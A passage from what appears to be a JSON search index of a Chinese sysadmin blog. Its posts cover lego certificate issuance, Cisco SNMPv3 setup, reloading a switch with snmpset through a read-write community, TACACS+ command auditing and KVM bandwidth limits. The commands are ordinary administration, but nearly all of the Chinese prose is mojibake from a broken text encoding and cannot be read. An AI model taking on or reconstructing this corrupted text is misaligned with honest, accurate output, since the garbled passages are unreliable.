run \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå›ç­”ä¸€ä¸‹Yes\u003c/p\u003e\n\u003cp\u003eç„¶åç”Ÿæˆçš„è¯ä¹¦éƒ½æ”¾åœ¨.lego/certificates/ç›®å½•ä¸‹\u003c/p\u003e\n\u003cp\u003eç»­è´¹ä¹Ÿæ˜¯ä¸€å¥è¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e lego --email\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;foo@bar.com\u0026#34;\u003c/span\u003e --domains\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;example.com\u0026#34;\u003c/span\u003e --http renew\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåŠå…¶ç®€å•ï¼Œä¹Ÿæ–¹ä¾¿æ¬è¿ã€‚ç”Ÿæˆçš„è¯ä¹¦crtæ˜¯å¸¦è¯ä¹¦é“¾æ¡çš„\u003c/p\u003e\n\u003cp\u003eç”³è¯·å¥½å°±å¯ä»¥è£…trojanäº†ã€‚å®åœ¨æ˜¯æ–¹ä¾¿\u003c/p\u003e\n\u003cp\u003eå¦‚æœDNSæ˜¯æ‰˜ç®¡åœ¨é˜¿é‡Œäº‘ä¸Šï¼Œå¯ä»¥å¼€ä¸€ä¸ªé˜¿é‡Œramè´¦å·ï¼Œç„¶åç”¨dnsçš„apiéªŒè¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eALICLOUD_ACCESS_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eaaaaaaaa  \u003cspan class=\"nv\"\u003eALICLOUD_SECRET_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebbbbbbbb \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e./lego --email admin@ddky.com --dns alidns --domains *.ddky.com run\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚æœDNSæ˜¯æ‰˜ç®¡åœ¨namesiloä¸Šï¼ŒåŒæ ·å¯ä»¥å¼€ä¸€ä¸ªapiçš„keyï¼Œæ—¶é—´ä¸€å®šè¦æ”¾é•¿ï¼Œå¦åˆ™ä¸ç”Ÿæ•ˆï¼\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNAMESILO_API_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eccccc \u003cspan class=\"nv\"\u003eNAMESILO_PROPAGATION_TIMEOUT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3600\u003c/span\u003e \u003cspan class=\"nv\"\u003eNAMESILO_POLLING_INTERVAL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e120\u003c/span\u003e \u003cspan class=\"nv\"\u003eNAMESILO_TTL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3600\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e./lego --email zhangranrui@gmail.com --dns namesilo --domains *.rendoumi.com run\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"ç”¨legoæ¥ä»£æ›¿acmeç”³è¯·å…è´¹sslè¯ä¹¦"},{"content":"https://www.cisco.com/c/en/us/support/docs/smb/routers/cisco-rv-series-small-business-routers/smb4127-configure-simple-network-management-protocol-snmp-on-rv320-a.html\nè¿™ç¯‡è¯´çš„å¾ˆè¯¦ç»†äº†\næŒ‰å›¾ç´¢éª¥å³å¯\nsnmpwalk v3å‚æ•°è§£é‡Šï¼š\n-v 1|2c|3 specifies SNMP version to use -u USER-NAME set security name (e.g. bert) -l LEVEL set security level (noAuthNoPriv|authNoPriv|authPriv) -a PROTOCOL set authentication protocol (MD5|SHA) -A PASSPHRASE set authentication protocol pass phrase -x PROTOCOL set privacy protocol (DES|AES) -X PASSPHRASE set privacy protocol pass phrase ç®€å•è¯´ï¼Œv3æ”¯æŒä¸¤é‡åŠ å¯†ï¼Œè¦è¾“å…¥ä¸¤ä¸ªå¯†ç \nsnmpset -v3 -u Cisco -l authPriv -a MD5 -A FuckCisco -x DES -X zhenbushidongxi 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i 2 ","permalink":"https://rendoumi.com/posts/20240124-cisco_snmp3/","summary":"\u003cp\u003e\u003ca href=\"https://www.cisco.com/c/en/us/support/docs/smb/routers/cisco-rv-series-small-business-routers/smb4127-configure-simple-network-management-protocol-snmp-on-rv320-a.html\"\u003ehttps://www.cisco.com/c/en/us/support/docs/smb/routers/cisco-rv-series-small-business-routers/smb4127-configure-simple-network-management-protocol-snmp-on-rv320-a.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eè¿™ç¯‡è¯´çš„å¾ˆè¯¦ç»†äº†\u003c/p\u003e\n\u003cp\u003eæŒ‰å›¾ç´¢éª¥å³å¯\u003c/p\u003e\n\u003cp\u003esnmpwalk v3å‚æ•°è§£é‡Šï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-v 1\u003cspan class=\"p\"\u003e|\u003c/span\u003e2c\u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e             specifies SNMP version to use\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-u USER-NAME          \u003cspan class=\"nb\"\u003eset\u003c/span\u003e security name \u003cspan class=\"o\"\u003e(\u003c/span\u003ee.g. bert\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-l LEVEL              \u003cspan class=\"nb\"\u003eset\u003c/span\u003e security level \u003cspan class=\"o\"\u003e(\u003c/span\u003enoAuthNoPriv\u003cspan class=\"p\"\u003e|\u003c/span\u003eauthNoPriv\u003cspan class=\"p\"\u003e|\u003c/span\u003eauthPriv\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-a PROTOCOL           \u003cspan class=\"nb\"\u003eset\u003c/span\u003e authentication protocol \u003cspan class=\"o\"\u003e(\u003c/span\u003eMD5\u003cspan class=\"p\"\u003e|\u003c/span\u003eSHA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-A PASSPHRASE         \u003cspan class=\"nb\"\u003eset\u003c/span\u003e authentication protocol pass phrase\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-x PROTOCOL           \u003cspan class=\"nb\"\u003eset\u003c/span\u003e privacy protocol \u003cspan class=\"o\"\u003e(\u003c/span\u003eDES\u003cspan class=\"p\"\u003e|\u003c/span\u003eAES\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-X PASSPHRASE         \u003cspan class=\"nb\"\u003eset\u003c/span\u003e privacy protocol pass phrase\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç®€å•è¯´ï¼Œv3æ”¯æŒä¸¤é‡åŠ å¯†ï¼Œè¦è¾“å…¥ä¸¤ä¸ªå¯†ç \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmpset -v3 -u Cisco -l authPriv -a MD5 -A FuckCisco -x DES -X zhenbushidongxi 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i \u003cspan class=\"m\"\u003e2\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Cisco snmpv3çš„è®¾ç½®"},{"content":"è¿™æ˜¯ä¸ªä»€ä¹ˆå‘½é¢˜ï¼Ÿï¼æ²¡åŠæ³•ï¼Œæœ‰æ—¶å€™éœ€è¦ç”¨åˆ°è¿™ç§æ–¹å¼\né¦–å…ˆå»ciscoäº¤æ¢æœºé…ç½®ï¼š\nsnmp-server community private RW snmp-server system-shutdown ç„¶ååœ¨linuxæœºå™¨ä¸Šæ‰§è¡Œï¼š\n# snmpset -v 2c -c private 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i 2 !--- This is an explanation of the variables that this command uses. 10.16.99.55 = ip address of your router private = R/W SNMP Community string of your router .1.3.6.1.4.1.9.2.9.9.0 = tsMsgSend SNMP MIB OID i = Integer as defined SYNTAX in the MIB 2 = reload command as defined in the MIB æœ€åï¼ŒFuck Cisco!!!\n","permalink":"https://rendoumi.com/posts/20240124-cisco_snmp_reboot/","summary":"\u003cp\u003eè¿™æ˜¯ä¸ªä»€ä¹ˆå‘½é¢˜ï¼Ÿï¼æ²¡åŠæ³•ï¼Œæœ‰æ—¶å€™éœ€è¦ç”¨åˆ°è¿™ç§æ–¹å¼\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå»ciscoäº¤æ¢æœºé…ç½®ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmp-server community private RW  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmp-server system-shutdown  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶ååœ¨linuxæœºå™¨ä¸Šæ‰§è¡Œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# snmpset -v 2c -c private 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i 2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e!--- This is an explanation of the variables that this \u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e uses.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          10.16.99.55 \u003cspan class=\"o\"\u003e=\u003c/span\u003e ip address of your router\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e               \u003cspan class=\"nv\"\u003eprivate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e R/W SNMP Community string of your router\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e.1.3.6.1.4.1.9.2.9.9.0 \u003cspan class=\"o\"\u003e=\u003c/span\u003e tsMsgSend SNMP MIB OID\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                     \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Integer as defined SYNTAX in the MIB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                     \u003cspan class=\"nv\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e reload \u003cspan class=\"nb\"\u003ecommand\u003c/span\u003e as defined in the MIB\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ€åï¼ŒFuck Cisco!!!\u003c/p\u003e","title":"Ciscoäº¤æ¢æœºé€šè¿‡snmpæ¥é‡å¯"},{"content":"æˆ‘ä»¬ç”¨çš„æ˜¯Cisco ASR 1001-Xè¿™ä¸ªè·¯ç”±å™¨æ¥åšBGPçš„ã€‚\nå‰ä¸¤å¤©åšå¤šçº¿BGPçš„æ—¶å€™ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯é‡åˆ°Bugäº†ï¼Œè¿˜æ˜¯æ“ä½œé¡ºåºæœ‰é—®é¢˜ï¼Œå¤§æ–­ç½‘ï¼Œç„¶åé‡å¯è·¯ç”±å™¨ã€‚\näº‹åæƒ³å›é¡¾çš„æ—¶å€™ä¹Ÿæ˜¯å„è‡ªæœ‰å„è‡ªçš„è®°å½•ï¼Œç»†èŠ‚è¯­ç„‰ä¸è¯¦\u0026hellip;\u0026hellip;\nå¹²è„†æ­å»ºä¸€ä¸ªæ—¥å¿—æœåŠ¡å™¨æ¥è®°å½•ä¸‹æ¥æ‰€æœ‰çš„æ“ä½œï¼Œä¾¿äºäº‹åå¤ç›˜\né¦–å…ˆåœ¨CentOS 7 çš„ç³»ç»Ÿä¸Šå®‰è£…TACACS+è½¯ä»¶ï¼Œå±…ç„¶åœ¨7ä¸Šç”¨çš„æ˜¯6çš„è½¯ä»¶ï¼Œè¿™ç‚¹ä¹Ÿå¾ˆæ€ªå¼‚\ncat \u0026lt;\u0026lt; EOF \u0026gt;/etc/yum.repos.d/tacacs-plus.repo [tacacs-plus] name=Tacacs Plus baseurl=http://li.nux.ro/download/nux/misc/el6/x86_64/ enabled=0 gpgcheck=1 gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro EOF å®‰è£…tacacs_plus\nyum â€“enablerepo=tacacs-plus install tac_plus æ³¨æ„ï¼Œæˆ‘ä»¬åªæ˜¯ç”¨tacacs_plusæ¥è®°å½•æ“ä½œæ—¥å¿—ï¼Œä¸æ˜¯ç”¨æ¥é™åˆ¶ç”¨æˆ·ç™»å½•å’Œæƒé™çš„ï¼Œæ‰€ä»¥åªéœ€è¦å…³æ³¨ä¸¤è¡Œï¼š\nvi /etc/tac_plus.conf key = \u0026#34;FuckFuckFuck\u0026#34; accounting file = /var/log/tac_acct.log ...... å¯åŠ¨ï¼Œcentos 6 æ²¡æœ‰systemctlï¼Œåªæœ‰service\nservice tac_plus start ok, tacacs+é…ç½®å¥½äº†ï¼Œç»§ç»­ï¼Œå»Ciscoè·¯ç”±å™¨ä¸Šé…\nRouter1#configure terminal Enter configuration commands, one per line. End with CNTL/Z. Router1(config)#tacacs-server host 192.168.171.13 Router1(config)#tacacs-server timeout 10 Router1(config)#tacacs-server key FuckFuckFuck Router1(config)#aaa new-model Router1(config)#aaa accounting commands 0 default stop-only group tacacs+ Router1(config)#aaa accounting commands 1 default stop-only group tacacs+ Router1(config)#aaa accounting commands 15 default stop-only group tacacs+ Router1(config)#end Router1# â€œ0â€ ç”¨æ¥å®¡è®¡exitå’Œendå‘½ä»¤ï¼Œè¿™æ ·å¯ä»¥æ˜ç¡®çŸ¥é“ç”¨æˆ·çš„ç™»å½•ã€‚\nâ€œ1â€ ç”¨æ¥å®¡è®¡éç‰¹æƒç”¨æˆ·çš„showå‘½ä»¤ã€‚\nâ€œ15â€ ç”¨æ¥å®¡è®¡ç‰¹æƒå‘½ä»¤å¯¹è·¯ç”±å™¨é…ç½®çš„æ”¹åŠ¨ã€‚\nçœ‹çœ‹æ—¥å¿—é‡Œæœ‰æ²¡æœ‰è®°å½•ï¼š\næ³¨æ„ï¼Œtacacs-serverçš„è¯­æ³•å¯èƒ½åœ¨iosç‰ˆæœ¬ä¸åŒçš„æƒ…å†µä¸‹è¯­æ³•ä¸åŒï¼š\n# tacacs server TS-AAA address ipv4 192.168.171.13 key FuckFuckFuck timeout 10 ","permalink":"https://rendoumi.com/posts/20240124-cisco_audit/","summary":"\u003cp\u003eæˆ‘ä»¬ç”¨çš„æ˜¯Cisco ASR 1001-Xè¿™ä¸ªè·¯ç”±å™¨æ¥åšBGPçš„ã€‚\u003c/p\u003e\n\u003cp\u003eå‰ä¸¤å¤©åšå¤šçº¿BGPçš„æ—¶å€™ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯é‡åˆ°Bugäº†ï¼Œè¿˜æ˜¯æ“ä½œé¡ºåºæœ‰é—®é¢˜ï¼Œå¤§æ–­ç½‘ï¼Œç„¶åé‡å¯è·¯ç”±å™¨ã€‚\u003c/p\u003e\n\u003cp\u003eäº‹åæƒ³å›é¡¾çš„æ—¶å€™ä¹Ÿæ˜¯å„è‡ªæœ‰å„è‡ªçš„è®°å½•ï¼Œç»†èŠ‚è¯­ç„‰ä¸è¯¦\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003eå¹²è„†æ­å»ºä¸€ä¸ªæ—¥å¿—æœåŠ¡å™¨æ¥è®°å½•ä¸‹æ¥æ‰€æœ‰çš„æ“ä½œï¼Œä¾¿äºäº‹åå¤ç›˜\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆåœ¨CentOS 7 çš„ç³»ç»Ÿä¸Šå®‰è£…TACACS+è½¯ä»¶ï¼Œå±…ç„¶åœ¨7ä¸Šç”¨çš„æ˜¯6çš„è½¯ä»¶ï¼Œè¿™ç‚¹ä¹Ÿå¾ˆæ€ªå¼‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;/etc/yum.repos.d/tacacs-plus.repo  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[tacacs-plus]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ename=Tacacs Plus  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebaseurl=http://li.nux.ro/download/nux/misc/el6/x86_64/  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eenabled=0  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003egpgcheck=1  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003egpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®‰è£…tacacs_plus\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e yum â€“enablerepo\u003cspan class=\"o\"\u003e=\u003c/span\u003etacacs-plus install tac_plus\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼Œæˆ‘ä»¬åªæ˜¯ç”¨tacacs_plusæ¥è®°å½•æ“ä½œæ—¥å¿—ï¼Œä¸æ˜¯ç”¨æ¥é™åˆ¶ç”¨æˆ·ç™»å½•å’Œæƒé™çš„ï¼Œæ‰€ä»¥åªéœ€è¦å…³æ³¨ä¸¤è¡Œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/tac_plus.conf  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;FuckFuckFuck\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaccounting \u003cspan class=\"nv\"\u003efile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /var/log/tac_acct.log  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯åŠ¨ï¼Œcentos 6 æ²¡æœ‰systemctlï¼Œåªæœ‰service\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice tac_plus start  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eok, tacacs+é…ç½®å¥½äº†ï¼Œç»§ç»­ï¼Œå»Ciscoè·¯ç”±å™¨ä¸Šé…\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1#configure terminal  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEnter configuration commands, one per line.  End with CNTL/Z.  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#tacacs-server host 192.168.171.13  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#tacacs-server timeout 10  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#tacacs-server key FuckFuckFuck  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#aaa new-model  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#aaa accounting commands 0 default stop-only group tacacs+  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#aaa accounting commands 1 default stop-only group tacacs+  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#aaa accounting commands 15 default stop-only group tacacs+  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"c1\"\u003e#end  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRouter1#  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eâ€œ0â€ ç”¨æ¥å®¡è®¡exitå’Œendå‘½ä»¤ï¼Œè¿™æ ·å¯ä»¥æ˜ç¡®çŸ¥é“ç”¨æˆ·çš„ç™»å½•ã€‚\u003c/p\u003e","title":"Cisco è·¯ç”±å™¨çš„æ“ä½œå®¡è®¡"},{"content":"éœ€è¦å¼€ä¸€å°kvmçš„æµ‹è¯•æœºï¼Œä½†æ˜¯éœ€è¦é™åˆ¶é€Ÿåº¦ï¼Œ10M\næˆ‘ä»¬çš„ç‰©ç†æœºä½¿ç”¨äº†bridgeï¼Œä»¥åŠvlan tagï¼Œæ‰€ä»¥è™šæœºçš„ç½‘å¡æ˜¯br0.141\næŸ¥äº†ä¸€åœˆæ–‡æ¡£\n\u0026lt;interface type=\u0026#39;bridge\u0026#39;\u0026gt; \u0026lt;mac address=\u0026#39;52:54:00:db:4c:5f\u0026#39;/\u0026gt; \u0026lt;source bridge=\u0026#39;br0.141\u0026#39;/\u0026gt; \u0026lt;bandwidth\u0026gt; \u0026lt;inbound average=\u0026#39;1250\u0026#39; peak=\u0026#39;1250\u0026#39; burst=\u0026#39;1250\u0026#39;/\u0026gt; \u0026lt;outbound average=\u0026#39;1250\u0026#39; peak=\u0026#39;1250\u0026#39; burst=\u0026#39;1250\u0026#39;/\u0026gt; \u0026lt;/bandwidth\u0026gt; \u0026lt;model type=\u0026#39;virtio\u0026#39;/\u0026gt; æ³¨æ„é™é€Ÿçš„å•ä½ï¼šæ˜¯kilobyte per second\né‚£ä¹ˆï¼š\n1250 kilobyte per second, KB/s = 10 Mbps = 1.25 MB/s\n10 Mbpså°±æ˜¯é€šå¸¸æ„ä¹‰ä¸Šçš„ç½‘é€Ÿï¼Œ/8=1.25 MB/sï¼Œå°±æ˜¯æœºå™¨ä¸Šç”¨ä¸‹è½½è½¯ä»¶æ¯”å¦‚è¿…é›·ä¸‹è½½ï¼Œçœ‹åˆ°çš„é€Ÿåº¦ï¼ˆ1.25 MB/sï¼‰ã€‚\n","permalink":"https://rendoumi.com/posts/20240124-kvm_limit_bandwidth/","summary":"\u003cp\u003eéœ€è¦å¼€ä¸€å°kvmçš„æµ‹è¯•æœºï¼Œä½†æ˜¯éœ€è¦é™åˆ¶é€Ÿåº¦ï¼Œ10M\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬çš„ç‰©ç†æœºä½¿ç”¨äº†bridgeï¼Œä»¥åŠvlan tagï¼Œæ‰€ä»¥è™šæœºçš„ç½‘å¡æ˜¯br0.141\u003c/p\u003e\n\u003cp\u003eæŸ¥äº†ä¸€åœˆæ–‡æ¡£\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan 